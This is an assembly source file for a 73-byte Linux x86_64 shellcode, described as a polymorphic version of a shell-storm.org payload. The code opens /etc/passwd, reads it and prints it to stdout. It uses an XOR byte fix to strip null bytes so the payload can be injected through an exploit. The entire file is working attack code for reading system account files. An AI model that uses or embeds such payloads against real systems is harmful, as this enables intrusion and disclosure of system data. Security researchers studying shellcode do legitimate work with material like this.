; BITS 64
; Author Javier Tejedor (Polimorphic version of RingZer0 Team: http://shell-storm.org/shellcode/files/shellcode-878.php) 
; Read /etc/passwd Linux x86_64 Shellcode
; Shellcode size 73 bytes
; Date 17/10/2014

global _start

section .text

_start:
jmp _readfile

	path: db "/etc/passwdA"

_readfile:
; syscall open file
lea rdi, [rel path]
; NULL byte fix
xor byte [rdi + 11], 0x41

push 0x2
pop rax  

xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0xfff
push rsi
pop rdx
lea rsi, [rsp]
mov rdi, rax
push rdx
pop rax
mov dx, 0xfff; size to read
syscall
  
; syscall write to stdout

push 0x1
pop rdi
mov rdx, rax
mov rax, rdi
syscall
  
; syscall exit
;push 60
;pop rax
xor rax, rax
add al, 60
syscall
